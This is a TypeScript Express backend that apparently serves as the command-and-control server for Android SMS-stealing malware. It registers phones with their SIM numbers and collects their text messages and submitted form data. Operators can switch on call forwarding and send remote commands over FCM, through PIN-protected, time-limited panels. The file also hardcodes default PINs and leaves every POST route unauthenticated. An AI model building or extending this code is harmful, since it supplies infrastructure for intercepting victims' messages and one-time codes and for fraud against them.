import express, { type Express, type Request, type Response, type NextFunction } from "express";
import cors from "cors";
import pinoHttp from "pino-http";
import { eq, asc, desc, and, sql as drizzleSql } from "drizzle-orm";
import { logger } from "./lib/logger";
import { broadcast } from "./lib/ws";
import { sendFcmToToken } from "./lib/fcm";
import {
  sql as neonSql, db,
  apps, devices, messages, formData,
  DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN,
  mapApp, mapDevice, mapMessage, mapFormData,
  iso, isoReq, isExpired,
} from "./lib/db";

const app: Express = express();

app.use(pinoHttp({
  logger,
  serializers: {
    req(req) { return { id: req.id, method: req.method, url: req.url?.split("?")[0] }; },
    res(res) { return { statusCode: res.statusCode }; },
  },
}));
app.use(cors({ origin: "*", methods: ["GET", "POST", "PATCH", "PUT", "DELETE", "OPTIONS"] }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─── API key auth (skip POST, OPTIONS, /api/healthz) ───────────────────────
app.use((req: Request, res: Response, next: NextFunction) => {
  if (req.method === "POST" || req.method === "OPTIONS" || req.path === "/api/healthz") {
    return next();
  }
  const apiSecret = process.env.API_SECRET ?? "";
  if (!apiSecret) return next();
  const key = (req.headers["x-api-key"] as string | undefined)
    ?? String(req.query["apiKey"] ?? "");
  if (!key || key !== apiSecret) {
    res.status(401).json({ error: "Unauthorized" });
    return;
  }
  next();
});

// ─── Master PIN helper ──────────────────────────────────────────────────────
async function checkMasterPin(req: Request, res: Response): Promise<boolean> {
  const pin = (req.headers["x-master-pin"] as string | undefined) ?? "";
  if (!pin) { res.status(401).json({ error: "Master PIN required" }); return false; }
  const rows = await neonSql(`SELECT value FROM settings WHERE key = 'master_pin'`) as Array<{ value: string }>;
  const stored = rows[0]?.value ?? "master1234";
  if (pin !== stored) { res.status(401).json({ error: "Wrong Master PIN" }); return false; }
  return true;
}

function parseDevice(ua: string): string {
  if (/iPhone/.test(ua)) return "iPhone";
  if (/iPad/.test(ua)) return "iPad";
  if (/Android/.test(ua)) return "Android";
  if (/Windows/.test(ua)) return "Windows PC";
  if (/Macintosh|Mac OS/.test(ua)) return "Mac";
  if (/Linux/.test(ua)) return "Linux";
  return "Unknown Device";
}

// ─── Health ─────────────────────────────────────────────────────────────────
app.get("/api/healthz", (_req: Request, res: Response) => { res.json({ status: "ok" }); });

// ─── Apps ───────────────────────────────────────────────────────────────────
app.get("/api/apps", async (_req: Request, res: Response) => {
  const rows = await db.select().from(apps).orderBy(asc(apps.createdAt));
  for (const r of rows) {
    if (r.appId === DEFAULT_APP_ID && r.status !== "active") {
      await db.update(apps).set({ status: "active" }).where(eq(apps.appId, r.appId));
    } else if (r.appId !== DEFAULT_APP_ID && r.status === "active" && isExpired(r.createdAt)) {
      await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, r.appId));
    }
  }
  const fresh = await db.select().from(apps).orderBy(asc(apps.createdAt));
  res.json(fresh.map(mapApp));
});

app.get("/api/apps/:appId", async (req: Request, res: Response) => {
  const appId = req.params["appId"] as string;
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) { res.status(404).json({ error: "App not found" }); return; }
  if (row.appId !== DEFAULT_APP_ID && row.status === "active" && isExpired(row.createdAt)) {
    await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
    const [updated] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
    res.json(updated ? mapApp(updated) : mapApp(row));
    return;
  }
  res.json(mapApp(row));
});

app.post("/api/apps", async (req: Request, res: Response) => {
  const body = req.body as { appId?: string; name?: string; pin?: string; status?: string };
  if (!body.appId || !body.name) { res.status(400).json({ error: "appId and name are required" }); return; }
  const inserted = await db.insert(apps).values({
    appId: body.appId, name: body.name,
    pin: body.pin ?? "1234", status: body.status ?? "active",
  }).onConflictDoNothing({ target: apps.appId }).returning();
  if (inserted.length === 0) { res.status(409).json({ error: "App ID already exists" }); return; }
  res.status(201).json(mapApp(inserted[0]));
});

app.patch("/api/apps/:appId", async (req: Request, res: Response) => {
  const appId = req.params["appId"] as string;
  const body = req.body as { name?: string; pin?: string; status?: string; loginLimit?: number };
  const patch: Partial<typeof apps.$inferInsert> = {};
  if (body.name !== undefined) patch.name = body.name;
  if (body.pin !== undefined) patch.pin = body.pin;
  if (body.status !== undefined) patch.status = body.status;
  if (body.loginLimit !== undefined) patch.loginLimit = Math.min(100, Math.max(1, Number(body.loginLimit)));
  if (Object.keys(patch).length === 0) { res.status(400).json({ error: "No fields to update" }); return; }
  const [row] = await db.update(apps).set(patch).where(eq(apps.appId, appId)).returning();
  if (!row) { res.status(404).json({ error: "App not found" }); return; }
  res.json(mapApp(row));
});

app.delete("/api/apps/:appId", async (req: Request, res: Response) => {
  const [row] = await db.delete(apps).where(eq(apps.appId, req.params["appId"] as string)).returning();
  if (!row) { res.status(404).json({ error: "App not found" }); return; }
  res.json({ ok: true });
});

app.post("/api/apps/:appId/verify-pin", async (req: Request, res: Response) => {
  const appId = req.params["appId"] as string;
  const body = req.body as { pin?: string };
  if (!body.pin) { res.status(400).json({ error: "PIN required" }); return; }
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) { res.status(404).json({ error: "App not found" }); return; }
  if (row.appId !== DEFAULT_APP_ID && row.status === "active" && isExpired(row.createdAt)) {
    await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
    res.status(403).json({ error: "App is disabled" });
    return;
  }
  if (row.status !== "active") { res.status(403).json({ error: "App is disabled" }); return; }
  if (row.pin !== body.pin) { res.status(401).json({ error: "Wrong PIN" }); return; }
  const limit = row.loginLimit ?? 5;
  const activeRows = await neonSql(
    `SELECT COUNT(*) as cnt FROM admin_sessions WHERE app_id = $1 AND last_active > NOW() - INTERVAL '30 minutes'`,
    [appId],
  ) as Array<{ cnt: string }>;
  const activeCnt = Number(activeRows[0]?.cnt ?? 0);
  if (activeCnt >= limit) {
    res.status(429).json({ error: `Login limit reached. Maximum ${limit} concurrent session${limit === 1 ? "" : "s"} allowed. Please wait for someone to log out.` });
    return;
  }
  res.json({ ok: true, appId: row.appId, name: row.name });
});

// ─── Devices ────────────────────────────────────────────────────────────────
app.get("/api/devices", async (req: Request, res: Response) => {
  const userId = req.query["userId"] as string | undefined;
  const appId = req.query["appId"] as string | undefined;
  const where = appId ? eq(devices.appId, appId) : userId ? eq(devices.userId, userId) : undefined;
  const rows = where
    ? await db.select().from(devices).where(where)
    : await db.select().from(devices);
  res.json(rows.map(mapDevice));
});

app.get("/api/devices/:deviceId", async (req: Request, res: Response) => {
  const [row] = await db.select().from(devices).where(eq(devices.deviceId, req.params["deviceId"] as string)).limit(1);
  if (!row) { res.status(404).json({ error: "Device not found" }); return; }
  res.json(mapDevice(row));
});

app.patch("/api/devices/:deviceId", async (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  const patch: Partial<typeof devices.$inferInsert> = { updatedAt: new Date() };
  if (body["status"] !== undefined) patch.status = String(body["status"]);
  if (body["lastOnline"] !== undefined) patch.lastOnline = body["lastOnline"] ? new Date(String(body["lastOnline"])) : null;
  if (body["fcmToken"] !== undefined) patch.fcmToken = String(body["fcmToken"]);
  if (body["forwardEnabled"] !== undefined) patch.forwardEnabled = Boolean(body["forwardEnabled"]);
  if (body["forwardSlot"] !== undefined) patch.forwardSlot = body["forwardSlot"] === null ? null : Number(body["forwardSlot"]);
  if (body["starred"] !== undefined) patch.starred = Boolean(body["starred"]);
  const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, req.params["deviceId"] as string)).returning();
  if (!row) { res.status(404).json({ error: "Device not found" }); return; }
  const mapped = mapDevice(row);
  broadcast("device_updated", mapped);
  res.json(mapped);
});

app.delete("/api/devices/:deviceId", async (req: Request, res: Response) => {
  const deviceId = req.params["deviceId"] as string;
  await db.delete(messages).where(eq(messages.deviceId, deviceId));
  await db.delete(formData).where(eq(formData.deviceId, deviceId));
  const [row] = await db.delete(devices).where(eq(devices.deviceId, deviceId)).returning();
  if (!row) { res.status(404).json({ error: "Device not found" }); return; }
  const mapped = mapDevice(row);
  broadcast("device_deleted", { appId: mapped.appId, deviceId: mapped.deviceId });
  res.json({ ok: true });
});

// ─── Messages ───────────────────────────────────────────────────────────────
app.get("/api/messages", async (req: Request, res: Response) => {
  const appId = req.query["appId"] as string | undefined;
  const userId = req.query["userId"] as string | undefined;
  const deviceId = req.query["deviceId"] as string | undefined;
  const limitParam = req.query["limit"] as string | undefined;
  const offsetParam = req.query["offset"] as string | undefined;
  const rawLimit = limitParam == null ? 500 : Math.max(0, Math.min(5000, parseInt(limitParam, 10) || 0));
  const offset = Math.max(0, parseInt(offsetParam ?? "0", 10) || 0);
  const where = appId ? eq(messages.appId, appId)
    : userId ? eq(messages.userId, userId)
    : deviceId ? eq(messages.deviceId, deviceId)
    : undefined;
  const base = where
    ? db.select().from(messages).where(where).orderBy(desc(messages.receivedAt))
    : db.select().from(messages).orderBy(desc(messages.receivedAt));
  const rows = rawLimit > 0
    ? await base.limit(rawLimit).offset(offset)
    : await base;
  res.json(rows.map(mapMessage));
});

app.post("/api/messages", async (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  if (!body["appId"] || !body["deviceId"] || !body["fromNumber"] || !body["body"]) {
    res.status(400).json({ error: "appId, deviceId, fromNumber and body are required" });
    return;
  }
  const senderStr = String(body["fromSender"] ?? "");
  if (senderStr.toLowerCase().startsWith("call forward")) {
    res.status(204).end();
    return;
  }
  const uid = String(body["userId"] ?? `USR-${String(body["deviceId"]).slice(-6).toUpperCase()}`);
  const [inserted] = await db.insert(messages).values({
    appId: String(body["appId"]),
    deviceId: String(body["deviceId"]),
    userId: uid,
    fromSender: String(body["fromSender"] ?? "Unknown"),
    fromNumber: String(body["fromNumber"]),
    toNumber: body["toNumber"] ? String(body["toNumber"]) : null,
    body: String(body["body"]),
    isSensitive: Boolean(body["isSensitive"] ?? false),
  }).returning();
  const mapped = mapMessage(inserted);
  broadcast("message_added", { appId: mapped.appId, message: mapped });
  res.status(201).json({ ok: true, id: mapped.id });
});

app.delete("/api/messages/:id", async (req: Request, res: Response) => {
  const id = Number(req.params["id"]);
  if (Number.isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const [row] = await db.delete(messages).where(eq(messages.id, id)).returning();
  if (!row) { res.status(404).json({ error: "Not found" }); return; }
  const mapped = mapMessage(row);
  broadcast("message_deleted", { appId: mapped.appId, deviceId: mapped.deviceId, id });
  res.json({ ok: true });
});

// ─── Form Data ──────────────────────────────────────────────────────────────
app.get("/api/data", async (req: Request, res: Response) => {
  const appId = req.query["appId"] as string | undefined;
  const deviceId = req.query["deviceId"] as string | undefined;
  if (!appId) { res.status(400).json({ error: "appId is required" }); return; }
  const where = deviceId
    ? and(eq(formData.appId, appId), eq(formData.deviceId, deviceId))
    : eq(formData.appId, appId);
  const rows = await db.select().from(formData).where(where!).orderBy(desc(formData.submittedAt));
  res.json(rows.map(mapFormData));
});

app.post("/api/data", async (req: Request, res: Response) => {
  const body = req.body as { appId?: string; deviceId?: string; data?: Record<string, unknown> };
  if (!body.appId || !body.deviceId) { res.status(400).json({ error: "appId and deviceId are required" }); return; }
  if (!body.data || typeof body.data !== "object" || Array.isArray(body.data)) {
    res.status(400).json({ error: "data must be a JSON object" });
    return;
  }
  const [row] = await db.insert(formData).values({
    appId: body.appId, deviceId: body.deviceId, data: body.data,
  }).returning();
  const mapped = mapFormData(row);
  broadcast("form_data_added", { appId: mapped.appId, formData: mapped });
  res.status(201).json(mapped);
});

app.delete("/api/data/:id", async (req: Request, res: Response) => {
  const id = Number(req.params["id"]);
  if (Number.isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const [row] = await db.delete(formData).where(eq(formData.id, id)).returning();
  if (!row) { res.status(404).json({ error: "Not found" }); return; }
  const mapped = mapFormData(row);
  broadcast("form_data_deleted", { appId: mapped.appId, id });
  res.json({ ok: true });
});

app.delete("/api/data", async (req: Request, res: Response) => {
  const appId = req.query["appId"] as string | undefined;
  const deviceId = req.query["deviceId"] as string | undefined;
  if (!appId || !deviceId) { res.status(400).json({ error: "appId and deviceId are required" }); return; }
  const rows = await db.delete(formData)
    .where(and(eq(formData.appId, appId), eq(formData.deviceId, deviceId)))
    .returning();
  const ids = rows.map(r => r.id);
  broadcast("form_data_bulk_deleted", { appId, deviceId, ids });
  res.json({ ok: true, deleted: ids.length });
});

// ─── Register + Heartbeat ───────────────────────────────────────────────────
app.post("/api/register", async (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  if (!body["appId"] || !body["deviceId"] || !body["name"]) {
    res.status(400).json({ error: "appId, deviceId and name are required" });
    return;
  }
  const safeAppId = String(body["appId"]);
  const existing = await db.select().from(apps).where(eq(apps.appId, safeAppId)).limit(1);
  if (existing.length === 0) {
    res.status(403).json({ error: "App not authorized. Admin must create this App ID first." });
    return;
  }
  if (existing[0].status !== "active") {
    res.status(403).json({ error: "App is disabled. Contact admin to activate." });
    return;
  }
  const uid = String(body["userId"] ?? `USR-${String(body["deviceId"]).slice(-6).toUpperCase()}`);
  const rows = await neonSql(
    `INSERT INTO devices (device_id, app_id, user_id, name, android_version, sim1_carrier, sim1_phone, sim2_carrier, sim2_phone, status, last_online, forward_enabled, forward_slot, fcm_token)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)
     ON CONFLICT (device_id) DO UPDATE SET
       app_id = EXCLUDED.app_id,
       user_id = EXCLUDED.user_id,
       name = EXCLUDED.name,
       android_version = EXCLUDED.android_version,
       sim1_carrier = EXCLUDED.sim1_carrier,
       sim1_phone = EXCLUDED.sim1_phone,
       sim2_carrier = EXCLUDED.sim2_carrier,
       sim2_phone = EXCLUDED.sim2_phone,
       status = EXCLUDED.status,
       last_online = EXCLUDED.last_online,
       forward_enabled = EXCLUDED.forward_enabled,
       forward_slot = EXCLUDED.forward_slot,
       fcm_token = EXCLUDED.fcm_token,
       updated_at = NOW()
     RETURNING *, (xmax = 0) AS was_created`,
    [
      String(body["deviceId"]), safeAppId, uid, String(body["name"]),
      Number(body["androidVersion"] ?? 0),
      body["sim1Carrier"] != null ? String(body["sim1Carrier"]) : null,
      body["sim1Phone"] != null ? String(body["sim1Phone"]) : null,
      body["sim2Carrier"] != null ? String(body["sim2Carrier"]) : null,
      body["sim2Phone"] != null ? String(body["sim2Phone"]) : null,
      "online", new Date(),
      false, null,
      body["fcmToken"] != null ? String(body["fcmToken"]) : null,
    ],
  ) as Array<Record<string, unknown>>;
  const r = rows[0];
  const mapped = {
    id: Number(r["id"]), deviceId: String(r["device_id"]), appId: String(r["app_id"]),
    userId: String(r["user_id"]), name: String(r["name"]),
    androidVersion: Number(r["android_version"]),
    sim1Carrier: (r["sim1_carrier"] as string | null) ?? null,
    sim1Phone: (r["sim1_phone"] as string | null) ?? null,
    sim2Carrier: (r["sim2_carrier"] as string | null) ?? null,
    sim2Phone: (r["sim2_phone"] as string | null) ?? null,
    status: String(r["status"]),
    lastOnline: iso(r["last_online"] as Date | string | null),
    forwardEnabled: Boolean(r["forward_enabled"]),
    forwardSlot: r["forward_slot"] == null ? null : Number(r["forward_slot"]),
    fcmToken: (r["fcm_token"] as string | null) ?? null,
    installedAt: isoReq(r["installed_at"] as Date | string),
    updatedAt: isoReq(r["updated_at"] as Date | string),
    starred: Boolean(r["starred"] ?? false),
  };
  const created = Boolean(r["was_created"]);
  broadcast("device_updated", mapped);
  res.status(created ? 201 : 200).json({ ok: true, deviceId: mapped.deviceId, created });
});

app.post("/api/heartbeat", async (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  if (!body["deviceId"]) { res.status(400).json({ error: "deviceId is required" }); return; }
  const now = new Date();
  const patch: Partial<typeof devices.$inferInsert> = { status: "online", lastOnline: now, updatedAt: now };
  if (body["fcmToken"] != null) patch.fcmToken = String(body["fcmToken"]);
  const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, String(body["deviceId"]))).returning();
  if (!row) { res.status(403).json({ error: "Device not registered. Contact admin." }); return; }
  broadcast("device_updated", mapDevice(row));
  res.json({ ok: true });
});

// ─── FCM ────────────────────────────────────────────────────────────────────
app.post("/api/fcm/send", async (req: Request, res: Response) => {
  const body = req.body as { deviceId?: string; data?: Record<string, string> };
  if (!body.deviceId) { res.status(400).json({ error: "deviceId is required" }); return; }
  if (!body.data || typeof body.data !== "object") { res.status(400).json({ error: "data object is required" }); return; }
  const [device] = await db.select().from(devices).where(eq(devices.deviceId, body.deviceId)).limit(1);
  if (!device) { res.status(404).json({ error: "Device not found" }); return; }
  if (!device.fcmToken) { res.status(422).json({ error: "Device has no FCM token registered" }); return; }
  const safeData: Record<string, string> = {};
  for (const [k, v] of Object.entries(body.data)) {
    safeData[k] = (v !== null && typeof v === "object") ? JSON.stringify(v) : String(v);
  }
  try {
    const result = await sendFcmToToken(device.fcmToken, safeData);
    res.json({ success: true, messageId: result.messageId });
  } catch (err: unknown) {
    const e = err as Error & { fcmStatus?: number; fcmBody?: { error?: { message?: string; details?: Array<{ errorCode?: string }> } } };
    const errorCode = e.fcmBody?.error?.details?.[0]?.errorCode;
    const msg = e.fcmBody?.error?.message;
    if (e.fcmStatus === 404 || errorCode === "UNREGISTERED") {
      res.status(410).json({ error: "Phone ka FCM token purana ho gaya. Device pe app open karo — naya token automatically register ho jayega, fir command dobara bhejo.", detail: msg });
      return;
    }
    if (e.fcmStatus === 400 && (msg?.includes("not a valid FCM registration token") || msg?.includes("INVALID_ARGUMENT"))) {
      res.status(400).json({ error: "FCM token invalid — Android app ko reinstall karo aur fresh heartbeat bhejo.", detail: msg });
      return;
    }
    if (e.fcmStatus) { res.status(e.fcmStatus).json({ error: e.fcmBody }); return; }
    res.status(500).json({ error: (err as Error).message });
  }
});

app.post("/api/fcm/online-check", async (req: Request, res: Response) => {
  const body = req.body as { token?: string; data?: Record<string, string> };
  if (!body.token) { res.status(400).json({ error: "token is required" }); return; }
  const safeData: Record<string, string> = {};
  for (const [k, v] of Object.entries(body.data ?? { type: "online_check" })) safeData[k] = String(v);
  try {
    const result = await sendFcmToToken(body.token, safeData);
    res.json({ success: true, messageId: result.messageId });
  } catch (err: unknown) {
    const e = err as Error & { fcmStatus?: number; fcmBody?: unknown };
    if (e.fcmStatus) { res.status(e.fcmStatus).json({ error: e.fcmBody }); return; }
    res.status(500).json({ error: (err as Error).message });
  }
});

// ─── Master Admin ───────────────────────────────────────────────────────────
app.post("/api/admin/verify-master-pin", async (req: Request, res: Response) => {
  const body = req.body as { pin?: string };
  if (!body.pin) { res.status(400).json({ error: "PIN required" }); return; }
  const rows = await neonSql(`SELECT value FROM settings WHERE key = 'master_pin'`) as Array<{ value: string }>;
  const stored = rows[0]?.value ?? "master1234";
  if (body.pin !== stored) { res.status(401).json({ error: "Wrong Master PIN" }); return; }
  res.json({ ok: true });
});

app.patch("/api/admin/master-pin", async (req: Request, res: Response) => {
  const body = req.body as { currentPin?: string; newPin?: string };
  if (!body.currentPin || !body.newPin) { res.status(400).json({ error: "currentPin and newPin required" }); return; }
  if (body.newPin.length < 4) { res.status(400).json({ error: "PIN must be at least 4 characters" }); return; }
  const rows = await neonSql(`SELECT value FROM settings WHERE key = 'master_pin'`) as Array<{ value: string }>;
  const stored = rows[0]?.value ?? "master1234";
  if (body.currentPin !== stored) { res.status(401).json({ error: "Current PIN is wrong" }); return; }
  await neonSql(`INSERT INTO settings (key, value) VALUES ('master_pin', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.newPin]);
  res.json({ ok: true });
});

app.get("/api/master/apps", async (req: Request, res: Response) => {
  if (!await checkMasterPin(req, res)) return;
  const rows = await db.select().from(apps).orderBy(asc(apps.createdAt));
  const sessionCounts = await neonSql(
    `SELECT app_id, COUNT(*) as cnt FROM admin_sessions WHERE last_active > NOW() - INTERVAL '30 minutes' GROUP BY app_id`,
  ) as Array<{ app_id: string; cnt: string }>;
  const sessionMap = Object.fromEntries(sessionCounts.map(r => [r.app_id, Number(r.cnt)]));
  res.json(rows.map(r => ({
    id: r.id, appId: r.appId, name: r.name, pin: r.pin,
    status: r.status, loginLimit: r.loginLimit ?? 5,
    activeSessions: sessionMap[r.appId] ?? 0,
    createdAt: isoReq(r.createdAt),
  })));
});

app.post("/api/master/apps", async (req: Request, res: Response) => {
  if (!await checkMasterPin(req, res)) return;
  const body = req.body as { appId?: string; name?: string; pin?: string };
  if (!body.appId || !body.name || !body.pin) { res.status(400).json({ error: "appId, name and pin are required" }); return; }
  const inserted = await db.insert(apps).values({
    appId: body.appId, name: body.name, pin: body.pin, status: "active",
  }).onConflictDoNothing({ target: apps.appId }).returning();
  if (inserted.length === 0) { res.status(409).json({ error: "App ID already exists" }); return; }
  const r = inserted[0];
  res.status(201).json({ id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status, loginLimit: r.loginLimit ?? 5, activeSessions: 0, createdAt: isoReq(r.createdAt) });
});

app.patch("/api/master/apps/:appId", async (req: Request, res: Response) => {
  if (!await checkMasterPin(req, res)) return;
  const appId = req.params["appId"] as string;
  const body = req.body as { name?: string; pin?: string; status?: string; loginLimit?: number };
  const patch: Partial<typeof apps.$inferInsert> = {};
  if (body.name) patch.name = body.name;
  if (body.pin) patch.pin = body.pin;
  if (body.status) patch.status = body.status;
  if (body.loginLimit !== undefined) {
    const lim = Number(body.loginLimit);
    if (lim >= 1 && lim <= 100) patch.loginLimit = lim;
  }
  const updated = await db.update(apps).set(patch).where(eq(apps.appId, appId)).returning();
  if (updated.length === 0) { res.status(404).json({ error: "App not found" }); return; }
  const r = updated[0];
  res.json({ id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status, loginLimit: r.loginLimit ?? 5, createdAt: isoReq(r.createdAt) });
});

app.delete("/api/master/apps/:appId", async (req: Request, res: Response) => {
  if (!await checkMasterPin(req, res)) return;
  const appId = req.params["appId"] as string;
  if (appId === DEFAULT_APP_ID) { res.status(400).json({ error: "Cannot delete the default app" }); return; }
  await db.delete(apps).where(eq(apps.appId, appId));
  res.json({ ok: true });
});

// ─── Admin Sessions ─────────────────────────────────────────────────────────
app.get("/api/admin/sessions", async (req: Request, res: Response) => {
  const appId = (req.query["appId"] as string | undefined) ?? "";
  const rows = await neonSql(
    `SELECT id, login_time, last_active, user_agent, ip, device FROM admin_sessions WHERE app_id = $1 ORDER BY login_time DESC`,
    [appId],
  ) as Array<Record<string, unknown>>;
  res.json(rows.map(r => ({
    id: String(r["id"]),
    loginTime: isoReq(r["login_time"] as Date | string),
    lastActive: isoReq(r["last_active"] as Date | string),
    userAgent: String(r["user_agent"] ?? ""),
    ip: String(r["ip"] ?? ""),
    device: String(r["device"] ?? ""),
  })));
});

app.post("/api/admin/sessions", async (req: Request, res: Response) => {
  const ua = (req.headers["user-agent"] as string | undefined) ?? "";
  const ip = String(
    req.headers["x-forwarded-for"] ?? req.socket.remoteAddress ?? "unknown"
  ).split(",")[0].trim();
  let appId = "";
  try { appId = (req.body as { appId?: string }).appId ?? ""; } catch { /* ignore */ }
  const existing = await neonSql(
    `SELECT id FROM admin_sessions WHERE user_agent = $1 AND ip = $2 AND app_id = $3 ORDER BY last_active DESC LIMIT 1`,
    [ua, ip, appId],
  ) as Array<{ id: string }>;
  if (existing.length > 0) {
    const id = existing[0].id;
    await neonSql(`UPDATE admin_sessions SET last_active = NOW() WHERE id = $1`, [id]);
    res.json({ sessionId: id });
    return;
  }
  const id = crypto.randomUUID();
  await neonSql(
    `INSERT INTO admin_sessions (id, user_agent, ip, device, app_id) VALUES ($1, $2, $3, $4, $5)`,
    [id, ua, ip, parseDevice(ua), appId],
  );
  res.json({ sessionId: id });
});

app.patch("/api/admin/sessions/:id/ping", async (req: Request, res: Response) => {
  const rows = await neonSql(
    `UPDATE admin_sessions SET last_active = NOW() WHERE id = $1 RETURNING id`,
    [req.params["id"]],
  ) as Array<{ id: string }>;
  if (rows.length === 0) { res.status(404).json({ error: "session not found" }); return; }
  res.json({ ok: true });
});

app.delete("/api/admin/sessions/:id", async (req: Request, res: Response) => {
  await neonSql(`DELETE FROM admin_sessions WHERE id = $1`, [req.params["id"]]);
  res.json({ ok: true });
});

app.delete("/api/admin/sessions", async (req: Request, res: Response) => {
  const appId = (req.query["appId"] as string | undefined) ?? "";
  await neonSql(`DELETE FROM admin_sessions WHERE app_id = $1`, [appId]);
  res.json({ ok: true });
});

// ─── Stats / Sample / Seed ──────────────────────────────────────────────────
app.get("/api/stats", async (req: Request, res: Response) => {
  const appId = req.query["appId"] as string | undefined;
  if (appId) {
    const [d] = await db.select({ c: drizzleSql<string>`count(*)::text` }).from(devices).where(eq(devices.appId, appId));
    const [m] = await db.select({ c: drizzleSql<string>`count(*)::text` }).from(messages).where(eq(messages.appId, appId));
    const [f] = await db.select({ c: drizzleSql<string>`count(*)::text` }).from(formData).where(eq(formData.appId, appId));
    res.json({ devices: Number(d?.c ?? 0), messages: Number(m?.c ?? 0), formData: Number(f?.c ?? 0) });
    return;
  }
  const [a] = await db.select({ c: drizzleSql<string>`count(*)::text` }).from(apps);
  const [d] = await db.select({ c: drizzleSql<string>`count(*)::text` }).from(devices);
  const [m] = await db.select({ c: drizzleSql<string>`count(*)::text` }).from(messages);
  const [f] = await db.select({ c: drizzleSql<string>`count(*)::text` }).from(formData);
  res.json({ apps: Number(a?.c ?? 0), devices: Number(d?.c ?? 0), messages: Number(m?.c ?? 0), formData: Number(f?.c ?? 0) });
});

app.get("/api/sample", async (req: Request, res: Response) => {
  const appId = req.query["appId"] as string | undefined;
  if (appId) {
    const [d] = await db.select().from(devices).where(eq(devices.appId, appId)).limit(1);
    const [m] = await db.select().from(messages).where(eq(messages.appId, appId)).limit(1);
    const [f] = await db.select().from(formData).where(eq(formData.appId, appId)).limit(1);
    res.json({
      devices: d ? mapDevice(d) : null,
      messages: m ? mapMessage(m) : null,
      formData: f ? mapFormData(f) : null,
    });
    return;
  }
  const [a] = await db.select().from(apps).limit(1);
  const [d] = await db.select().from(devices).limit(1);
  const [m] = await db.select().from(messages).limit(1);
  const [f] = await db.select().from(formData).limit(1);
  res.json({
    apps: a ? mapApp(a) : null,
    devices: d ? mapDevice(d) : null,
    messages: m ? mapMessage(m) : null,
    formData: f ? mapFormData(f) : null,
  });
});

app.post("/api/seed", async (_req: Request, res: Response) => {
  const existing = await db.select().from(apps).where(eq(apps.appId, DEFAULT_APP_ID)).limit(1);
  if (existing.length === 0) {
    await db.insert(apps).values({
      appId: DEFAULT_APP_ID, name: DEFAULT_APP_NAME, pin: DEFAULT_APP_PIN, status: "active",
    }).onConflictDoNothing({ target: apps.appId });
  }
  res.json({ ok: true, message: "Database is ready" });
});

// ─── Events placeholder (WS handled in index.ts) ───────────────────────────
app.get("/api/events", (_req: Request, res: Response) => {
  res.status(426).send("Expected websocket upgrade");
});

export default app;
